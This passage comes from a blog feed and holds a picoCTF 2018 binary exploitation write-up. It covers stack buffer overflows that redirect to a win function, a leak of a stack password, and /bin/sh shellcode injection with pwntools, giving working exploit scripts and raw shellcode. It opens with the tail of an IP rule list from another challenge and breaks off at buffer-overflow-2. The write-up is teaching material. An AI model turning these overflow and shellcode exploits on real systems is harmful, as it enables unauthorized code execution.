  <span style="color:#f1fa8c">&#34;D:61.110.82.125/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:65.153.114.120/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:66.116.147.181/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:68.115.251.76/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:69.221.145.150/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:72.183.132.206/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:75.73.228.192/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:79.198.89.109/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:80.244.147.207/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:81.14.204.154/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:83.0.8.119/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:84.147.231.129/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:84.185.44.166/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:87.195.80.126/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:9.206.212.33/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:9.95.128.208/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:92.213.148.0/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:95.166.116.45/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:97.220.93.190/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;A:0.0.0.0/0&#34;</span>,
]);
</code></pre></td></tr></table>
</div>
</div><p>All objectives completed :)) Thank you SANS &hellip;</p>
]]></content></item><item><title>picoCTF 2018 - Binary Exploitation</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-binary-exploitation/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-binary-exploitation/</guid><description>buffer-overflow-0 source: vuln.c binary: vuln The below code is vulnerable to bufferoverflow as input can be bigger then the 16 bytes buffer size
1 2 3 4 void vuln(char *input){ char buf[16]; strcpy(buf, input); } ./vuln XXXXXXXXXXXXXXXXXXXX
buffer-overflow-1 source: vuln.c binary: vuln The below code is vulnerable to overflow attack because gets cannot know in advance whether the size of the user input will be bigger then BUFSIZE</description><content type="html"><![CDATA[<h2 id="buffer-overflow-0">buffer-overflow-0</h2>
<ul>
<li>source: <a href="./resources/buffer-overflow-0/vuln.c">vuln.c</a></li>
<li>binary: <a href="./resources/buffer-overflow-0/vuln">vuln</a></li>
</ul>
<p>The below code is vulnerable to bufferoverflow as input can be bigger then the 16 bytes buffer size</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">vuln</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>input){
  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">16</span>];
  strcpy(buf, input);
}
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>./vuln XXXXXXXXXXXXXXXXXXXX</p>
</blockquote>
<h2 id="buffer-overflow-1">buffer-overflow-1</h2>
<ul>
<li>source: <a href="./resources/buffer-overflow-1/vuln.c">vuln.c</a></li>
<li>binary: <a href="./resources/buffer-overflow-1/vuln">vuln</a></li>
</ul>
<p>The below code is vulnerable to overflow attack because gets cannot know in advance whether the size of the user input will be bigger then BUFSIZE</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">vuln</span>(){
  <span style="color:#8be9fd">char</span> buf[BUFSIZE];
  gets(buf);
}
</code></pre></td></tr></table>
</div>
</div><p>With radare2, we can deduct the size of the overflow without dumping a core:</p>
<ol>
<li>the buffer starts at ebp-0x28 (40 bytes)</li>
<li>it is followed by the old ebp (4 bytes)</li>
<li>So the return address to the main function is at offset 44</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x080484d0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">aa</span>
[<span style="color:#50fa7b">x</span>] <span style="color:#8be9fd;font-style:italic">Analyze</span> <span style="color:#8be9fd;font-style:italic">al</span><span style="color:#8be9fd;font-style:italic">l</span> <span style="color:#8be9fd;font-style:italic">flags</span> <span style="color:#8be9fd;font-style:italic">starting</span> <span style="color:#8be9fd;font-style:italic">with</span> <span style="color:#8be9fd;font-style:italic">sym.</span> <span style="color:#8be9fd;font-style:italic">and</span> <span style="color:#8be9fd;font-style:italic">entry0</span> (<span style="color:#8be9fd;font-style:italic">aa</span>)
[0<span style="color:#50fa7b">x080484d0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pdf</span> @ <span style="color:#8be9fd;font-style:italic">sym.vuln</span>
            <span style="color:#6272a4">; CALL XREF from main @ 0x80486ae</span>
/ 46: <span style="color:#50fa7b">sym.vuln</span> ()<span style="color:#6272a4">;</span>
|           <span style="color:#6272a4">; var int32_t var_28h @ ebp-0x28</span>
|           0<span style="color:#50fa7b">x0804862f</span>      <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">ebp</span>
|           0<span style="color:#50fa7b">x08048630</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">e5</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">ebp</span>, <span style="color:#8be9fd;font-style:italic">esp</span>
|           0<span style="color:#50fa7b">x08048632</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec28</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x28</span>
[<span style="color:#50fa7b">...</span>]
[0<span style="color:#50fa7b">x080484d0</span>]<span style="color:#ff79c6">&gt;</span> ! <span style="color:#8be9fd;font-style:italic">python</span> <span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">c</span> <span style="color:#f1fa8c">&#39;print 0x28&#39;</span>
40
</code></pre></td></tr></table>
</div>
</div><p>Alternatively, we know the buffer size is 32, so we can trigger a segmentation fault with a crafted message.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#f1fa8c">&#34;print &#39;A&#39;*32 + &#39;1111&#39; + &#39;2222&#39; + &#39;3333&#39; + &#39;4444&#39;&#34;</span> | ./vuln	<span style="color:#6272a4">#crafted message</span>
dmesg | tail -1
<span style="color:#ff79c6">[</span>88469.482647<span style="color:#ff79c6">]</span> vuln<span style="color:#ff79c6">[</span>15175<span style="color:#ff79c6">]</span>: segfault at <span style="color:#bd93f9">34343434</span> ip <span style="color:#bd93f9">0000000034343434</span> sp 00000000ffb84110 error <span style="color:#bd93f9">14</span> in libc-2.31.so<span style="color:#ff79c6">[</span>f7db3000+1e8000<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>dmesg</strong> shows <code>eip 34343434</code>, 34 being the ascii for &lsquo;4&rsquo;, we knows the return address occupy the &lsquo;4444&rsquo; in the code below</p>
<p>A successful exploitation of this binary is to return to the win function address which prints the flag. This address can be obtained with objdump:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">objdump -t resources/buffer-overflow-1/vuln | grep win
080485cb g     F .text	<span style="color:#bd93f9">00000064</span>              win
</code></pre></td></tr></table>
</div>
</div><p>To respect the little-endianess of our architecture we will append the return address formatted with <code>struct.pack('&lt;I', 0x80485cb)</code></p>
<ul>
<li><strong>&lt;</strong> stands for Little-endian</li>
<li><strong>I</strong> stands for unsigned int (which is of size 4 bytes)</li>
<li>if the binary was 64bits, we would have used <strong>Q</strong> instead of I</li>
</ul>
<p>The below python scripts allows successful exploitation</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/bin/sh</span>
python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;import struct; ret = struct.pack(&#39;&lt;I&#39;, 0x80485cb); print &#39;A&#39;*44 + ret&#34;</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">./</span>vuln
</code></pre></td></tr></table>
</div>
</div><p>The python3 implementation is a bit more tricky as print is no longer suitable to write bytearray because it adds \x00; instead we can use sys.stdout.buffer.write
It requires byte-string so make sure to convert your &lsquo;A&rsquo; in byte-string by prefixing</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python3 <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;import struct; import sys; ret = struct.pack(&#39;&lt;I&#39;, 0x80485cb); sys.stdout.buffer.write(b&#39;A&#39;*44 + ret)&#34;</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">./</span>vuln
</code></pre></td></tr></table>
</div>
</div><h2 id="leak-me">leak-me</h2>
<ul>
<li>source: <a href="./resources/leak-me/auth.c">auth</a></li>
<li>binary: <a href="./resources/leak-me/auth">auth</a></li>
</ul>
<p>The password local variable is immediately followed by the name local in the stack. We can fill the name local with a bunch of &lsquo;A&rsquo;</p>
<pre><code>Higher address
+---------------------------+
|000000000000000000000000000|   password[64]
+---------------------------+
|0000000............AAAAAAAA|   name[256]
+---------------------------+
Lower addres
</code></pre>
<p>Later in the code, a 28 bytes string is appended to the name variable, and therefore it will overflow the password variable if we have written at least 256-27 * &lsquo;A&rsquo; in name</p>
<blockquote>
<p>strcat(name, &ldquo;,\nPlease Enter the Password.&quot;);</p>
</blockquote>
<pre><code>+---------------------------+
|000000000000000.drowssaP eh|   password
+---------------------------+
|t retnE esaelP\n,AAA...AAAA|   name
+---------------------------+
</code></pre>
<p>The consequence is there is no longer <code>\x00</code> character in the name variable to mark the end of string, and therefore a latter puts(name) will leak the content of both variables.</p>
<p>Indeed the password is then populated resulting in the below stack:</p>
<pre><code>+---------------------------+
|00000000&lt;--real password--&gt;|   password
+---------------------------+
|t retnE esaelP\n,AAA...AAAA|   name
+---------------------------+
</code></pre>
<p>A latter greeting message calls <code>puts(name)</code> which results in the below output that reveals the password to get the flag: &lsquo;AAAA&hellip;.AAA\nPlease Enter t&lt;&ndash;real password&ndash;&gt;&rsquo;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>

DEV<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>

LOCAL_PATH<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;.&#39;</span>
h, p <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>, <span style="color:#bd93f9">38315</span>
PLEASE <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;,</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Please Enter the Password.&#34;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_process</span>():
  <span style="color:#ff79c6">if</span> DEV:
    <span style="color:#ff79c6">return</span> process(LOCAL_PATH <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/auth&#39;</span>)
  <span style="color:#ff79c6">else</span>:
    <span style="color:#ff79c6">return</span> remote(h, p)

p <span style="color:#ff79c6">=</span> get_process()
p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;your name?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>, <span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> (<span style="color:#bd93f9">256</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">len</span>(PLEASE)))
p<span style="color:#ff79c6">.</span>recvline()		<span style="color:#6272a4">#p.recv() returns only part of the output because server is a bit slow</span>
prompt <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">.</span>recvline()	<span style="color:#6272a4">#so it is better to use p.recvline() instead</span>
pwd_position <span style="color:#ff79c6">=</span> prompt<span style="color:#ff79c6">.</span>find(PLEASE)<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">len</span>(PLEASE)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
pwd <span style="color:#ff79c6">=</span> prompt[pwd_position:]<span style="color:#ff79c6">.</span>strip()
p<span style="color:#ff79c6">.</span>sendline(pwd)
<span style="color:#8be9fd;font-style:italic">print</span> p<span style="color:#ff79c6">.</span>recvall()
</code></pre></td></tr></table>
</div>
</div><h2 id="shellcode">shellcode</h2>
<ul>
<li>source: <a href="./resources/shellcode/vuln.c">vuln.c</a></li>
<li>binary: <a href="./resources/shellcode/vuln">vuln</a></li>
</ul>
<p>This program will execute whatever is in the buf local variable which is of size 148 bytes.</p>
<blockquote>
<p>((void (*)())buf)();</p>
</blockquote>
<p>So we can simply find any smaller shellcode on <a href="http://shell-storm.org/shellcode/">Shell Storm</a> for linux 32 bits architecture</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#f1fa8c">&#39;sc = &#34;\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68&#34;; print sc&#39;</span> &gt; sc.bin

cat sc.bin - | ./vuln
</code></pre></td></tr></table>
</div>
</div><p>Note that the shell will close immediately, so we have to keep it waiting for stdin by adding a <code>-</code> sign at the end of the cat command</p>
<p>Another way is to use pwnlib.shellcraft function:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
<span style="color:#ff79c6">from</span> os.path <span style="color:#ff79c6">import</span> join

DEV<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>

context(arch<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;i386&#39;</span>, os<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;linux&#39;</span>, bits <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;32&#39;</span>)

REMOTE_PATH<span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed&#39;</span>
LOCAL_PATH<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;.&#39;</span>
PRGM <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;vuln&#39;</span>
h, u <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>, <span style="color:#f1fa8c">&#39;0xade1&#39;</span>

<span style="color:#ff79c6">if</span> DEV:
  p <span style="color:#ff79c6">=</span> process(join(LOCAL_PATH, PRGM))
<span style="color:#ff79c6">else</span>:
  s <span style="color:#ff79c6">=</span> ssh(host<span style="color:#ff79c6">=</span>h, user<span style="color:#ff79c6">=</span>u)
  p <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>process(argv<span style="color:#ff79c6">=</span>join(REMOTE_PATH,PRGM), cwd<span style="color:#ff79c6">=</span>REMOTE_PATH)

sc <span style="color:#ff79c6">=</span> pwnlib<span style="color:#ff79c6">.</span>shellcraft<span style="color:#ff79c6">.</span>i386<span style="color:#ff79c6">.</span>sh()
payload <span style="color:#ff79c6">=</span> asm(sc)
<span style="color:#6272a4">#payload = &#34;\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&#34;</span>

p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;Enter a string!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>, payload)
p<span style="color:#ff79c6">.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id="buffer-overflow-2">buffer-overflow-2</h2>
<ul>
<li>source: <a href="./resources/buffer-overflow-2/vuln.c">vuln.c</a></li>
<li>binary: <a href="./resources/buffer-overflow-2/vuln">vuln</a></li>
</ul>
<p>The win function will show us the flag if called with two specific arguments arg1=0xDEADBEEF and arg2=0xDEADC0DE</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
